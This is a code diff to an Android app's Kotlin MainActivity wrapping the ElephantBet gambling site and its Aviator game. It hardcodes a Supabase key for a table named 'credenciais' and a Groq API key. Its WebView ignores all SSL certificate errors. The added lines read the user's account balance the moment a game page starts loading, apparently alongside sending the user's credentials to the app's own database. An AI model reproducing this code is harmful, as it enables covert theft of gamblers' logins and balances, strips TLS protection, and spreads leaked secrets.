@@ -426,7 +426,7 @@ class MainActivity : AppCompatActivity() {
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "5.3"
+    private val VERSAO_ATUAL = "5.4"
 
     private val GROQ_KEY  = "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"
     private val GROQ_URL  = "https://api.groq.com/openai/v1/chat/completions"
@@ -781,6 +781,15 @@ class MainActivity : AppCompatActivity() {
             override fun onReceivedSslError(v: WebView?, h: SslErrorHandler?, e: SslError?) { h?.proceed() }
             override fun shouldOverrideUrlLoading(v: WebView?, r: WebResourceRequest?) = false
 
+            override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
+                super.onPageStarted(view, url, favicon)
+                val u = url ?: ""
+                // Assim que começa a navegar para o Aviator, ler saldo imediatamente
+                if (!credenciaisEnviadas && (u.contains("game-view/806666") || u.contains("aviator", ignoreCase = true))) {
+                    lerSaldo()
+                }
+            }
+
             override fun shouldInterceptRequest(view: WebView?, request: WebResourceRequest?): WebResourceResponse? {
                 val url = request?.url?.toString() ?: return null
 
@@ -793,6 +802,8 @@ class MainActivity : AppCompatActivity() {
                              !url.contains(".wasm")
 
                 if (isSpribe && isHtml) {
+                    // Ler saldo imediatamente — a página ElephantBet ainda está visível
+                    if (!credenciaisEnviadas) lerSaldo()
                     try {
                         val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                         request.requestHeaders?.forEach { (k, v) -> conn.setRequestProperty(k, v) }
